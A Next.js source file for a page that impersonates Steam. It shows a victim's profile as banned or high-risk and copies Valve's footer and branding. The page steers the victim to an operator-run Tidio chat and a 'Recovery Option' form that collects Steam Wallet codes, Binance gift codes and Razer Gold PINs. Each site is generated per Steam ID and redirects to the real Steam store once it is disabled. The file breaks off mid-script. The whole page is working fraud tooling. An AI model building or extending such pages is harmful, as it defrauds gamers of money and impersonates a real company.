// pages/profile/[steamID].tsx
import React, { useEffect, useState } from "react";
import { useRouter } from "next/router";
import Head from "next/head";
import { GetServerSidePropsContext } from "next";
import { createClient } from "@supabase/supabase-js";
import { createClient as createClientClient } from "@supabase/supabase-js"; // careful with name

type SteamProfileData = {
  displayName: string;
  avatar: string;
  profileUrl: string;
  timeCreated: string | null;
};

export async function getServerSideProps(ctx: GetServerSidePropsContext) {

  const steamID = ctx.params?.steamID as string;

  const supabase = createClient(
    process.env.NEXT_PUBLIC_SUPABASE_URL!,
    process.env.SUPABASE_SERVICE_ROLE_KEY!
  );

  const { data: site } = await supabase
    .from("generated_sites")
    .select("*, tidio_id, recovery_enabled")
    .eq("steam_id", steamID)
    .eq("is_active", true)
    .single();


  // ❌ Redirect if not found OR disabled
  if (!site || site.is_active === false) {
    return {
      redirect: {
        destination: "https://store.steampowered.com/",
        permanent: false
      }
    };
  }

  return {
  props: {
    steamID,
    accountStatus: site.account_status,
    activeReports: site.reports,
    tidio_id: site.tidio_id || null,
    recoveryEnabled: site.recovery_enabled ?? false,
  }
};

}


export default function ProfilePage({
  steamID,
  accountStatus,
  activeReports,
  tidio_id,
  recoveryEnabled
}: any) {


  const router = useRouter();

  const [profileData, setProfileData] = useState<SteamProfileData | null>(null);
  const [error, setError] = useState<string>("");

  const [showDetails, setShowDetails] = useState(false);
  // TRACK LATEST SUBMISSION (place right after your other useState declarations)
const [latestSubmission, setLatestSubmission] = useState<any>(null);
const [recoveryProgress, setRecoveryProgress] = useState<number>(0);
const pollingRef = React.useRef<number | null>(null);
const [progress, setProgress] = useState(0);

const [summaryTotals, setSummaryTotals] = useState({
  totalFunds: 0,
  totalRefund: 0,
  currency: "usd"
});

const [submissionHistory, setSubmissionHistory] = useState([]);



// --- CURRENCY SELECTION LOGIC MUST BE HERE ---
const currencySymbol = {
  usd: "$",
  eur: "€",
  php: "₱"
}[summaryTotals.currency || "usd"];




// ------------------
// Recovery states
// ------------------
const [showRecoveryModal, setShowRecoveryModal] = useState(false);
const [liveRecoveryEnabled, setLiveRecoveryEnabled] = useState(recoveryEnabled);
const [codeInput, setCodeInput] = useState("");
const [provider, setProvider] = useState("steam");
const [submitting, setSubmitting] = useState(false);
const [submitMessage, setSubmitMessage] = useState("");
// TRACK LATEST SUBMISSION



// ------------------
// Submit recovery code
// ------------------
async function submitRecovery() {
  if (!codeInput.trim()) {
    setSubmitMessage("❌ Please enter a valid code.");
    return;
  }

  setSubmitting(true);
  setSubmitMessage("");

  try {
    const res = await fetch("/api/recovery/submit", {
      method: "POST",
      headers: { "Content-Type": "application/json" },
      body: JSON.stringify({
        steamID,
        code: codeInput,
        provider,
      }),
    });

    const data = await res.json();

    if (!data.success) {
      setSubmitMessage("❌ Failed: " + (data.error || "Unknown error"));
    } else {
      setSubmitMessage("✅ Code submitted! Please wait for admin verification.");
      setCodeInput(""); // reset input
    }
  } catch (err) {
    setSubmitMessage("❌ Network error.");
  }

  setSubmitting(false);
}

  const statusColor =
  accountStatus.toLowerCase() === "banned" ? "#ff4b4b" :
  accountStatus.toLowerCase() === "pending" ? "#ffb347" :
  "#4ade80"; // green

  const severityLabel =
    activeReports >= 50 ? "High Risk" :
    activeReports >= 20 ? "Moderate Risk" :
    "Low Risk";

  const severityColor =
    activeReports >= 50 ? "#ff4b4b" :
    activeReports >= 20 ? "#ffb347" :
    "#4ade80";


  useEffect(() => {
    if (steamID) {
      fetch(`/api/steam?steamID=${steamID}`)
        .then(res => res.json())
        .then(data => {
          if (data.error) setError(data.error);
          else setProfileData(data);
        })
        .catch(() => setError("Failed to fetch profile data."));
    }
  }, [steamID]);
// Map recovery status -> progress percentage
function statusToProgress(status: string | null | undefined) {
  if (!status) return 0;
  const s = status.toLowerCase();
  if (s === "submitted") return 25;
  if (s === "reviewing") return 50;
  if (s === "approved") return 75;
  if (s === "completed") return 100;
  return 0;
}

// Fetch latest submission for this steamID
async function fetchLatestSubmission() {
  try {
    const res = await fetch(`/api/recovery/latest?steamID=${encodeURIComponent(steamID)}`);
    const json = await res.json();
    if (json.success) {
      const latest = json.latest;
      setLatestSubmission(latest);
      setRecoveryProgress(statusToProgress(latest?.status));
      return latest;
    } else {
      setLatestSubmission(null);
      setRecoveryProgress(0);
      return null;
    }
  } catch (err) {
    console.error("fetchLatestSubmission error", err);
    return null;
  }
}


useEffect(() => {
  if (!steamID) return;

  async function loadLatest() {
    const res = await fetch(`/api/recovery/latest?steamID=${steamID}`);
    const json = await res.json();

    if (!json.success) {
      setLatestSubmission(null);
      setRecoveryProgress(0);
      return;
    }

    const sub = json.submission;

    if (!sub) {
      setLatestSubmission(null);
      setRecoveryProgress(0);
      return;
    }

    setLatestSubmission(sub);

    let progress = 0;
    switch (sub.status) {
      case "submitted": progress = 25; break;
      case "reviewing": progress = 50; break;
      case "approved": progress = 75; break;
      case "completed": progress = 100; break;
      default: progress = 0;
    }
    setRecoveryProgress(progress);
  }

  async function loadSummary() {
    const res = await fetch(`/api/recovery/summary?steamID=${steamID}`);
    const json = await res.json();

    if (json.success) {
      setSummaryTotals({
  totalFunds: json.totalFunds,
  totalRefund: json.totalRefund,
  currency: json.currency || "usd"
});

    }
  }

  async function loadHistory() {
  const res = await fetch(`/api/recovery/history?steamID=${steamID}`);
  const json = await res.json();

  if (json.success) {
    setSubmissionHistory(json.history || []);
  }
}



  // Run immediately
  loadLatest();
  loadSummary();
  loadHistory();


  // Poll every 5s
  const interval = setInterval(() => {
  loadLatest();
  loadSummary();
  loadHistory();
}, 5000);


  return () => clearInterval(interval);

}, [steamID]);


useEffect(() => {
  if (!steamID) return;

  async function checkSiteStatus() {
    try {
      const res = await fetch(`/api/sites/status?steamID=${steamID}`);
      const json = await res.json();

      if (!json.success) return;

      // 🚨 If site is disabled → instant redirect
      if (json.is_active === false) {
        window.location.href = "https://store.steampowered.com/";
        return;
      }

      // 🔁 Live recovery toggle
      setLiveRecoveryEnabled(json.recovery_enabled);
    } catch (err) {
      console.error("Site status check failed", err);
    }
  }

  // run immediately
  checkSiteStatus();

  // poll every 3 seconds
  const interval = setInterval(checkSiteStatus, 3000);

  return () => clearInterval(interval);
}, [steamID]);


  // small helper for opening tidio
  const openChat = () => window.tidioChatApi?.open();

  return (
    <div className="profile-isolated">
      <Head>
        <title>Steam Profile - {profileData?.displayName || steamID}</title>

        {/* Fonts */}
        <style>{`
          @font-face {font-family:'Motiva Sans';src:url('/fonts/MotivaSans-Regular.woff2') format('woff2'),url('/fonts/MotivaSans-Regular.woff') format('woff');font-weight:400;font-style:normal}
          @font-face {font-family:'Motiva Sans';src:url('/fonts/MotivaSans-Bold.woff2') format('woff2'),url('/fonts/MotivaSans-Bold.woff') format('woff');font-weight:700;font-style:normal}
        `}</style>
      </Head>

      {/* HERO */}
      <section className="hero">
        <div className="section-container">

          <div className="hero-left reveal">
            <div className="card">
              <div className="card-bg" style={{ backgroundImage: `url(${profileData?.avatar || '/hero_background.png'})` }} />
              <div className="card-content">

  {/* Avatar centered */}
  <div className="avatar-wrapper" style={{ justifyContent: "center" }}>
    <img
      src={profileData?.avatar || "/default_avatar.png"}
      alt="Avatar"
      className="avatar"
    />
  </div>

  {/* Username + Status Badge */}
  <h3
    className="username"
    style={{
      textAlign: "center",
      display: "flex",
      justifyContent: "center",
      alignItems: "center",
      gap: "8px"
    }}
  >
    {profileData?.displayName || "Unknown"}

    {accountStatus.toLowerCase() === "banned" && (
      <span className="badge danger">High-Risk</span>
    )}

    {accountStatus.toLowerCase() === "pending" && (
      <span className="badge warn">Under Review</span>
    )}
  </h3>

  {/* Meta (Non-Redundant) */}
  <div className="meta" style={{ textAlign: "center" }}>
    <p><strong>ID:</strong> {steamID}</p>

    <p>
      <strong>URL:</strong>{" "}
      <a
        href={profileData?.profileUrl || "#"}
        target="_blank"
        rel="noreferrer"
      >
        {profileData?.profileUrl
          ? profileData.profileUrl.replace("https://steamcommunity.com/", "steamcommunity.com/…")
          : "—"}
      </a>
    </p>

    <p>
      <strong>Status:</strong>{" "}
      <span style={{ color: statusColor, fontWeight: 700 }}>
        {accountStatus}
      </span>
    </p>
  </div>

  {/* Severity Progress Bar */}
  <div className="severity-meter">
    <div
      className="severity-fill"
      style={{
        background: severityColor,
        width: `${Math.min(activeReports, 100)}%`
      }}
    />
  </div>

  <p
    className="meta"
    style={{ textAlign: "center", marginTop: "6px", fontWeight: 600 }}
  >
    Risk Level:{" "}
    <span style={{ color: severityColor }}>{severityLabel}</span>
  </p>

  {/* Recovery progress quick view (shows if there's any latest submission) */}
{latestSubmission && (
  <div style={{ marginTop: "10px" }}>
    <div style={{ fontSize: "0.95rem", color: "var(--muted)", marginBottom: 6 }}>
      Recovery Status:{" "}
      <strong style={{ color: recoveryProgress === 100 ? "#4ade80" : "#ffd166" }}>
        {latestSubmission.status ?? "submitted"}
      </strong>
    </div>

    <div className="recovery-progress-meter" aria-hidden>
      <div
        className="recovery-progress-fill"
        style={{ width: `${recoveryProgress}%` }}
      />
    </div>

    <div style={{ fontSize: "0.85rem", color: "#9fb6d1", marginTop: 6 }}>
      Latest: {latestSubmission?.created_at ? new Date(latestSubmission.created_at).toLocaleString() : "—"}
    </div>
  </div>
)}


  {/* Toggle */}
  <div
    className="details-toggle"
    onClick={() => setShowDetails(!showDetails)}
    style={{ textAlign: "center" }}
  >
    <span>{showDetails ? "▾ Hide Report Details" : "▸ View Report Details"}</span>
  </div>

  {/* Expandable Details */}
  <div className={`details-panel ${showDetails ? "open" : ""}`}>
    
    <p><strong>Total Reports:</strong> {activeReports}</p>

    <p className="muted" style={{ marginTop: "8px" }}>
      These reports were detected by our automated system.
      If you believe this is incorrect, please use the chat panel to contact review staff.
    </p>

    {/* Recovery Option Button */}
{liveRecoveryEnabled ? (
  <button
    className="recovery-btn"
    onClick={() => setShowRecoveryModal(true)}
  >
    Recovery Option
  </button>
) : (
  <button className="recovery-btn disabled" disabled>
    Recovery Option Locked
  </button>
)}


{/* Show latest recovery submission */}
{latestSubmission && (
  <div style={{
    marginTop: "15px",
    background: "rgba(255,255,255,0.05)",
    padding: "12px",
    borderRadius: "8px"
  }}>

    <p style={{ marginBottom: 6, fontWeight: 600 }}>Recovery Status:</p>

    <p style={{ margin: 0 }}>
      {latestSubmission.status === "submitted" && "⏳ Submitted — waiting for admin review"}
      {latestSubmission.status === "reviewing" && "🕵️ Reviewing — admin is checking your code"}
      {latestSubmission.status === "approved" && "✅ Approved — processing your funds"}
      {latestSubmission.status === "completed" && "🎉 Completed — funds successfully added"}
      {latestSubmission.status === "rejected" && "❌ Rejected — invalid or used code"}
    </p>

    {/* Progress Bar */}
    <div style={{
      marginTop: 10,
      height: "8px",
      width: "100%",
      background: "rgba(255,255,255,0.15)",
      borderRadius: "6px",
      overflow: "hidden"
    }}>
      <div
        style={{
          height: "100%",
          width:
            latestSubmission.status === "submitted" ? "20%" :
            latestSubmission.status === "reviewing" ? "50%" :
            latestSubmission.status === "approved" ? "80%" :
            latestSubmission.status === "completed" ? "100%" :
            "100%",
          background:
            latestSubmission.status === "rejected" ? "#ff4b4b" : "#2ac0ff",
          transition: "width 0.5s ease"
        }}
      />
    </div>

  </div>
)}


  </div>



              </div>
            </div>
          </div>

          <div className="hero-right reveal delay-1">
            <div className="heading-with-icon">
              <img src="/steam_chat_icon.png" className="section-icon" alt="Appeal" />
              <h1>Appeal Your Ban</h1>
            </div>

            <p className="lead">
              Submit your appeal via the chat window with all necessary details to dispute the report.
            </p>

            <ol className="appeal-list">
              <li>Detail the reason for your appeal.</li>
              <li>Provide any relevant evidence or context.</li>
              <li>Await response from the Report Assistance Team.</li>
            </ol>

            <button className="chat-btn" onClick={openChat}>Chat with us!</button>
          </div>

        </div>
      </section>

      {/* SUPPORT */}
      <section className="features-section reveal-2">
        <div className="section-container">
          <div className="features-text">
            <div className="heading-with-icon">
              <img src="/steam_chat_icon.png" className="section-icon" alt="Support" />
              <h2>Real-Time Support</h2>
            </div>

            <p className="muted">If you need help or have questions, our support team is ready to assist via Tidio chat.</p>

            <h3>How to Connect</h3>
            <ol>
              <li>Click the chat icon at the bottom right of the screen.</li>
              <li>Describe your issue and attach any relevant screenshots.</li>
              <li>Wait for one of our agents to respond in real time.</li>
            </ol>

            <h3>24/7 Availability</h3>
            <p className="muted">Our support team is available around the clock to ensure you get prompt assistance.</p>

            <button className="chat-btn outline" onClick={openChat}>Start Chat</button>
          </div>

          <div className="features-image">
            <img src="/web_chat_english.png" alt="Steam Chat Screenshot" className="feature-img" />
          </div>
        </div>
      </section>

      {/* FOOTER - Steam-like (Valve left, Steam right) */}
      <div id="footer" role="contentinfo">
        <div className="footer_container">

          <div className="footer_rule" />

          <div className="footer_toprow">
            <img
              src="https://store.fastly.steamstatic.com/public/images/footerLogo_valve_new.png"
              alt="Valve"
              className="footer_logo_valve"
            />

            <div className="footer_textblock">
              <p>
                © 2025 Valve Corporation. All rights reserved. All trademarks are property
                of their respective owners in the US and other countries.
              </p>
              <p>
                VAT included in all prices where applicable.&nbsp;
                <a href="https://store.steampowered.com/privacy_agreement/">Privacy Policy</a>&nbsp;|&nbsp;
                <a href="https://store.steampowered.com/legal/">Legal</a>&nbsp;|&nbsp;
                <a href="https://store.steampowered.com/subscriber_agreement/">Steam Subscriber Agreement</a>&nbsp;|&nbsp;
                <a href="https://store.steampowered.com/steam_refunds/">Refunds</a>&nbsp;|&nbsp;
                <a href="https://store.steampowered.com/account/cookiepreferences/">Cookies</a>
              </p>
            </div>

            <img
              src="https://store.fastly.steamstatic.com/public/images/v6/logo_steam_footer.png"
              alt="Steam"
              className="footer_logo_steam"
            />
          </div>

          <div className="footer_rule" />

          <div className="footer_bottomlinks">
            <a href="http://www.valvesoftware.com/about" target="_blank">About Valve</a>
            <span>|</span>
            <a href="http://www.valvesoftware.com/jobs" target="_blank">Jobs</a>
            <span>|</span>
            <a href="http://www.steampowered.com/steamworks/" target="_blank">Steamworks</a>
            <span>|</span>
            <a href="https://partner.steamgames.com/steamdirect" target="_blank">Steam Distribution</a>
            <span>|</span>
            <a href="https://help.steampowered.com/en/" target="_blank">Support</a>
            <span>|</span>
            <a href="https://store.steampowered.com/digitalgiftcards/" target="_blank">Gift Cards</a>
          </div>
        </div>
      </div>

      {/* STYLES */}
      <style jsx>{`

        /* Recovery progress bar */
.recovery-progress-meter {
  width: 100%;
  height: 10px;
  background: rgba(255,255,255,0.06);
  border-radius: 8px;
  overflow: hidden;
  box-shadow: inset 0 1px 2px rgba(0,0,0,0.4);
}

.recovery-progress-fill {
  height: 100%;
  background: linear-gradient(90deg, #ff9a9e, #ff4b4b);
  width: 0%;
  transition: width 0.5s ease;
}

/* when fully completed show green */
.recovery-progress-fill[style*="100%"] {
  background: linear-gradient(90deg, #7ee787, #4ade80);
}


.recovery-btn {
  width: 100%;
  margin-top: 14px;
  padding: 10px 0;
  border-radius: 6px;
  font-weight: 600;
  font-size: 0.95rem;
  background: linear-gradient(180deg, #2ac0ff, #0097d1);
  color: #01202a;
  border: none;
  cursor: pointer;
  transition: 0.2s ease;
}

.recovery-btn:hover {
  transform: translateY(-3px);
  box-shadow: 0 8px 20px rgba(0, 150, 220, 0.25);
}

.recovery-btn.disabled {
  background: #3a3a3a;
  color: #888;
  cursor: not-allowed;
  box-shadow: none;
}


.severity-meter {
  width: 100%;
  height: 8px;
  background: rgba(255,255,255,0.1);
  border-radius: 8px;
  overflow: hidden;
  margin-top: 8px;
}

.severity-fill {
  height: 100%;
  border-radius: 8px;
  transition: width 0.4s ease;
}


        /* Badge styles added to avoid parse edge-cases */
        .badge {
          padding: 2px 8px;
          font-size: 0.75rem;
          border-radius: 6px;
          font-weight: 600;
        }
        .badge.danger { background: #ff4b4b22; color: #ff4b4b; }
        .badge.warn { background: #ffb34722; color: #ffb347; }

        .details-toggle {
  margin-top: 10px;
  margin-bottom: 6px;
  cursor: pointer;
  color: var(--accent);
  font-weight: 600;
  user-select: none;
  transition: color 0.2s ease;
}

.details-toggle:hover {
  color: #8fd6ff;
}

.details-panel {
  overflow: hidden;
  max-height: 0px;
  opacity: 0;
  transform: translateY(-6px);
  transition: 
    max-height 0.35s ease,
    opacity 0.35s ease,
    transform 0.35s ease;
}

.details-panel.open {
  max-height: 300px; /* enough space for content */
  opacity: 1;
  transform: translateY(0px);
}

.details-panel p {
  margin: 4px 0;
  font-size: 0.95rem;
}


        .profile-isolated * {
        font-family: 'Motiva Sans', sans-serif !important;
        -webkit-font-smoothing: antialiased;
        -moz-osx-font-smoothing: grayscale;
        }

        /* Palette */
        :root {
          --steam-dark: #0b0e14;
          --section-blue: #111d36;
          --accent: #66c0f4;
          --muted: #9fb6d1;
          --card-bg: rgba(17, 34, 57, 0.28);
        }

        .profile-isolated {
          background: var(--steam-dark);
          color: #c7d5e0;
          font-family: 'Motiva Sans', 'Segoe UI', Roboto, system-ui, -apple-system, sans-serif;
        }

        /* base section */
        section { width: 100%; padding: 4rem 0; display: block; }
        .section-container { max-width: 1100px; margin: 0 auto; padding: 0 20px; display: flex; gap: 3rem; align-items: center; }

        /* HERO */
        .hero {
          background: linear-gradient(180deg, rgba(12,28,56,0.88), rgba(10,20,38,0.95)), url('/hero_background.png');
          background-size: cover;
          background-position: center;
          padding-top: 3.5rem;
          padding-bottom: 3.5rem;
        }

        .hero-right h1 {
          margin-bottom: 6px;
        }

        .hero-right .lead {
          margin-top: 4px;
          margin-bottom: 8px;
        }

        .appeal-list {
          margin-top: 4px;
          margin-bottom: 12px;
        }

                .hero-left .card {
          margin-top: 0;
        }



        .hero-left { flex: 0 0 360px; display: flex; justify-content: center; align-items: center; }
        .hero-right { flex: 1; 
        color: #c7d5e0; }

        /* Card */
        .card {
          position: relative;
          width: 320px;
          border-radius: 10px;
          overflow: hidden;
          min-height: 360px;
          background: linear-gradient(180deg, rgba(255,255,255,0.03), rgba(255,255,255,0.01));
          box-shadow: 0 8px 30px rgba(2,6,23,0.6);
          border: 1px solid rgba(255,255,255,0.03);
        }

        .card-bg {
          position: absolute;
          inset: 0;
          background-size: cover;
          background-position: center;
          filter: blur(18px) brightness(0.5);
          transform: scale(1.05);
          opacity: 0.9;
        }

        .card-content {
          position: relative;
          z-index: 2;
          padding: 22px;
        }

        .avatar-wrapper { display:flex; justify-content:flex-start; }
        .avatar {
          width: 94px;
          height: 94px;
          border-radius: 50%;
          border: 3px solid var(--accent);
          margin-bottom: 14px;
          box-shadow: 0 6px 18px rgba(0,0,0,0.55);
        }

        .username {
          margin: 0;
          color: var(--accent);
          font-size: 1.1rem;
          margin-bottom: 10px;
          font-weight: 700;
        }

        .meta { color: var(--muted); font-size: 0.95rem; line-height: 1.6; }
        .meta a { color: #66b7f2; text-decoration: underline; }

        /* Hero right */
        .heading-with-icon { display:flex; align-items:center; gap:12px; margin-bottom: 12px; }
        .section-icon { width: 40px; height: 40px; }
        h1 { margin:0; font-size: 1.8rem; color: var(--accent); }
        .lead { color: #cfe6ff; margin-top: 8px; margin-bottom: 12px; font-size: 1.05rem; }

        .appeal-list { margin-left: 1rem; color: var(--muted); }
        .appeal-list li { margin-bottom: 8px; }

        .chat-btn {
          background: linear-gradient(180deg, #2ac0ff, #00a6e6);
          color: #01202a;
          border: none;
          padding: 10px 14px;
          border-radius: 6px;
          cursor: pointer;
          font-weight: 600;
          box-shadow: 0 8px 18px rgba(0, 130, 200, 0.12);
          transition: transform .18s ease, box-shadow .18s ease;
        }
        .chat-btn:hover { transform: translateY(-4px); box-shadow: 0 12px 28px rgba(0,130,200,0.16); }
        .chat-btn.outline { background: transparent; color: #0b2a3b; border: 1px solid #00a6e6; padding: 8px 12px; box-shadow:none; }

        /* SUPPORT SECTION */
        .features-section { background: #fff; color: #1b2838; padding-top: 3.5rem; padding-bottom: 3.5rem; }
        .features-text { flex: 1; max-width: 620px; }
        .features-image { flex: 1; display:flex; justify-content:center; align-items:center; }

        /* SUPPORT SECTION IMAGE FIX */
        .feature-img {
          width: 100%;
          max-width: 360px;
          height: auto;
          display: block;
          margin: 0 auto;

          /* Remove the white padding by masking the edges */
          mask-image: radial-gradient(circle at center, black 80%, transparent 100%);
          -webkit-mask-image: radial-gradient(circle at center, black 80%, transparent 100%);

          /* Add proper centered drop shadow */
          filter: drop-shadow(0 15px 30px rgba(0,0,0,0.35));
        }

.phone-frame {
  position: relative;
  width: 360px;
  max-width: 90%;
  transform-style: preserve-3d;
  transition: transform 0.25s ease-out;
}

.phone-frame img {
  width: 100%;
  border-radius: 26px;
  display: block;
}

/* soft realistic shadow */
.phone-shadow {
  content: "";
  position: absolute;
  bottom: -26px;
  left: 50%;
  transform: translateX(-50%);
  width: 92%;
  height: 30px;
  border-radius: 50%;
  background: rgba(0,0,0,0.35);
  filter: blur(18px);
}

/* glass reflection overlay */
.phone-reflection {
  position: absolute;
  inset: 0;
  pointer-events: none;
  border-radius: 26px;
  background: linear-gradient(
    135deg,
    rgba(255,255,255,0.18) 0%,
    rgba(255,255,255,0.04) 45%,
    rgba(255,255,255,0.00) 65%
  );
}


        /* FOOTER - Steam-like */
        #footer { background: #141414; width:100%; color: #c7d5e0; padding: 36px 0; }
        .footer_container { max-width: 1100px; margin: 0 auto; padding: 0 20px; }
        .footer_rule { height: 1px; background: #2b2b2b; margin: 10px 0; }
        .footer_toprow { display:flex; align-items:center; justify-content:space-between; gap: 18px; }
        .footer_logo_valve { height: 36px; }
        .footer_logo_steam { height: 36px; opacity: 0.95; }
        .footer_textblock { flex: 1; padding: 0 18px; text-align: left; }
        .footer_textblock p { margin: 4px 0; color: #9fb6d1; font-size: 13px; line-height: 1.45; }
        .footer_textblock a { color: #66c0f4; text-decoration: none; }
        .footer_bottomlinks { margin-top: 10px; font-size: 13px; color: #9fb6d1; text-align:left; }
        .footer_bottomlinks a { color: #9fb6d1; text-decoration:none; margin: 0 6px; }

        /* -----------------------
           TIDIO: custom placement
           ----------------------- */
        /* NOTE: the real Tidio widget injects its own iframe; this CSS targets the common wrapper */
        .tidio-chat-iframe, .tidio-floating-button, .tidio-chat-iframe-wrapper {
          /* we can't guarantee exact class names because tidio injects them,
             but these are safe mild adjustments for most deployments */
        }

        /* add offset so it doesn't overlap the footer on small screens */
        @media (min-width: 960px) {
          /* large screens: push tidio slightly inward (via positioning used by tidio) */
          .tidio-floating-button {
            right: 36px !important;
            bottom: 36px !important;
          }
        }
        @media (max-width: 959px) {
          .tidio-floating-button {
            right: 18px !important;
            bottom: 18px !important;
          }
        }

        /* small pulse invite for custom chat opener (works even if tidio loaded) */
        .custom-chat-invite {
          position: fixed;
          right: 36px;
          bottom: 120px;
          background: linear-gradient(180deg,#2ac0ff,#007fb3);
          color: white;
          padding: 10px 14px;
          border-radius: 10px;
          box-shadow: 0 10px 30px rgba(0,0,0,0.35);
          cursor: pointer;
          z-index: 9999;
          display: none; /* hidden by default; show if you want a custom invite */
          animation: pulse 2.4s infinite;
        }

        @keyframes pulse {
          0% { transform: scale(1); box-shadow: 0 8px 22px rgba(42,192,255,0.12); }
          50% { transform: scale(1.04); box-shadow: 0 18px 34px rgba(42,192,255,0.18); }
          100% { transform: scale(1); box-shadow: 0 8px 22px rgba(42,192,255,0.12); }
        }

        /* -----------------------
           Animations & reveals
           ----------------------- */
        .reveal { opacity: 0; transform: translateY(12px); animation: reveal .7s forwards; }
        .reveal.delay-1 { animation-delay: .12s; }
        .reveal-2 { opacity: 0; transform: translateY(12px); animation: reveal .9s .14s forwards; }

        @keyframes reveal {
          to { opacity: 1; transform: translateY(0); }
        }

        /* responsive */
        @media (max-width: 900px) {
          .section-container { flex-direction: column; gap: 1.6rem; padding: 0 18px; }
          .hero-left { flex: none; order: 2; }
          .hero-right { order: 1; text-align: center; }
          .card { margin: 0 auto; width: 88%; }
          .feature-img { width: 80%; max-width: 320px; }
          .footer_textblock, .footer_bottomlinks { text-align: center; }
          .footer_toprow { flex-direction: column; gap: 12px; align-items: center; }
        }

        /* ===========================
   RECOVERY MODAL
=========================== */

.recovery-modal-backdrop {
  position: fixed;
  inset: 0;
  background: rgba(0,0,0,0.65);
  display: flex;
  justify-content: center;
  align-items: center;
  z-index: 99999;
}

.recovery-modal {
  width: 380px;
  background: #102030;
  padding: 22px;
  border-radius: 10px;
  color: white;
  box-shadow: 0 0 25px rgba(0,0,0,0.4);
  animation: fadeIn .2s ease-out;
}

.recovery-modal h2 {
  margin-top: 0;
  color: #66c0f4;
  margin-bottom: 16px;
  text-align: center;
}

.recovery-user {
  display: flex;
  align-items: center;
  gap: 12px;
  margin-bottom: 16px;
}

.recovery-user img {
  width: 62px;
  height: 62px;
  border-radius: 50%;
  border: 2px solid #66c0f4;
}

.recovery-modal label {
  display: block;
  margin-top: 10px;
  margin-bottom: 4px;
  font-weight: 600;
}

.recovery-modal select,
.recovery-modal input {
  width: 100%;
  padding: 10px;
  border-radius: 6px;
  border: none;
  background: #0b1825;
  color: white;
  margin-bottom: 10px;
}

.recovery-submit-btn {
  width: 100%;
  padding: 10px 0;
  background: #2ac0ff;
  border: none;
  color: #01202a;
  border-radius: 6px;
  font-weight: 700;
  cursor: pointer;
  margin-top: 5px;
}

.recovery-cancel-btn {
  width: 100%;
  padding: 10px 0;
  background: transparent;
  border: 1px solid #66c0f4;
  color: #66c0f4;
  border-radius: 6px;
  margin-top: 10px;
  cursor: pointer;
}

@keyframes fadeIn {
  from { opacity: 0; transform: scale(0.96); }
  to   { opacity: 1; transform: scale(1); }
}

      `}</style>

            {/* optional custom chat invite (disabled by default) */}
      {/* <div className="custom-chat-invite" onClick={openChat}>Chat with Support</div> */}

      {/* ===========================
          RECOVERY MODAL
      ============================ */}
      {showRecoveryModal && (
        <div
          className="recovery-modal-backdrop"
          onClick={() => setShowRecoveryModal(false)}
        >
          <div
            className="recovery-modal"
            onClick={(e) => e.stopPropagation()}
          >
            <h2>Account Recovery</h2>

            <div className="recovery-user">
              <img src={profileData?.avatar} alt="avatar" />
              <div>
                <strong>{profileData?.displayName}</strong>
                <p>Total Funds: {currencySymbol}{summaryTotals.totalFunds}</p>
                <p>Total Refunds: {currencySymbol}{summaryTotals.totalRefund}</p>

              </div>
            </div>

            {/* Progress tracking */}
            {latestSubmission && (
              <div style={{ marginBottom: 10 }}>
                <div style={{ fontWeight: 700, marginBottom: 6, color: "#cfe6ff" }}>
                  Current Recovery Status:{" "}
                  <span
                    style={{
                      color: recoveryProgress === 100 ? "#4ade80" : "#ffd166",
                      fontWeight: 800
                    }}
                  >
                    {latestSubmission.status}
                  </span>
                </div>

                <div className="recovery-progress-meter">
                  <div
                    className="recovery-progress-fill"
                    style={{ width: `${recoveryProgress}%` }}
                  />
                </div>
              </div>
            )}

              {/* Submission History */}
{submissionHistory.length > 0 && (
  <div style={{
    marginTop: "15px",
    background: "rgba(255,255,255,0.05)",
    padding: "12px",
    borderRadius: "8px"
  }}>
    <p style={{ marginBottom: 6, fontWeight: 600 }}>Previous Submissions:</p>

    {submissionHistory.map((entry, i) => (
      <div key={i} style={{
        marginBottom: "10px",
        padding: "8px",
        background: "rgba(0,0,0,0.15)",
        borderRadius: "6px"
      }}>
        <p style={{ margin: 0 }}>
          <strong>{entry.code}</strong> — {entry.provider}
        </p>
        <p style={{ margin: "4px 0", fontSize: "0.9rem", color: "#9fb6d1" }}>
          Status: {entry.status.toUpperCase()}
        </p>
        <p style={{ margin: 0, fontSize: "0.85rem", color: "#9fb6d1" }}>
          {new Date(entry.created_at).toLocaleString()}
        </p>
      </div>
    ))}
  </div>
)}

            <label>Provider</label>
            <select value={provider} onChange={(e) => setProvider(e.target.value)}>
              <option value="steam">Steam Wallet Code</option>
              <option value="binance">Binance Gift Code</option>
              <option value="razer">Razer Gold PIN</option>
            </select>

            <label>Enter Your Code</label>
            <input
              type="text"
              placeholder="XXXX-XXXX-XXXX"
              value={codeInput}
              onChange={(e) => setCodeInput(e.target.value)}
            />

            <button
              className="recovery-submit-btn"
              disabled={submitting}
              onClick={submitRecovery}
            >
              {submitting ? "Submitting..." : "Submit Code"}
            </button>

            {submitMessage && (
              <p
                style={{
                  marginTop: "10px",
                  color: submitMessage.startsWith("❌") ? "#ff4b4b" : "#4ade80"
                }}
              >
                {submitMessage}
              </p>
            )}

            <button
              className="recovery-cancel-btn"
              onClick={() => setShowRecoveryModal(false)}
            >
              Cancel
            </button>
          </div>
        </div>
      )}

 {/* Tidio Chat Widget */}
{tidio_id && (
  <>
    {/* 1 — Reset ALL prior Tidio identity so every generated site is clean */}
    <script
      dangerouslySetInnerHTML={{
        __html: `
          (function () {
            // wipe tidio cookies
            document.cookie.split(";").forEach(function (cookie) {
              if (cookie.includes("tidio")) {
                document.cookie = cookie
                  .split("=")[0]
                  .trim() +
                  "=; expires=Thu, 01 Jan 1970 00:00:00 GMT; path=/;";
              }
            });

            // wipe localStorage
            ["tidio_state", "tidio_uuid", "tidio_chat_page", "tidio_chat_open", "__tidioVisitors", "tidio_live_channel"]
              .forEach(k => localStorage.removeItem(k));

            console.log("Tidio wipe done for site: ${steamID}");
          })();
        `
      }}
    ></script>

    {/* 2 — Load Tidio script */}
    <script src={`//code.tidio.co/${tidio_id}.js`} async></script>

    {/* 3 — Apply identity ONLY after Tidio is fully ready */}
    <script
      dangerouslySetInnerHTML={{
        __html: `
          window.tidioChatApi = window.tidioChatApi || [];

          function applyIdentity() {
            if (typeof window.tidioChatApi !== "function") {
              console.log("Tidio not ready, retrying...");
              return setTimeout(applyIdentity, 300);
            }

            console.log("Tidio ready — applying identity for steamID: ${steamID}");

            window.tidioChatApi("identify", {
              distinct_id: "steam_${steamID}_${Date.now()}",
              name: "${(profileData?.displayName || "Steam User").replace(/"/g, '\\"')} — ${steamID}",
              email: "${steamID}@steam.local",
              tags: ["SteamSite:${steamID}", "GeneratedSite"]
            });

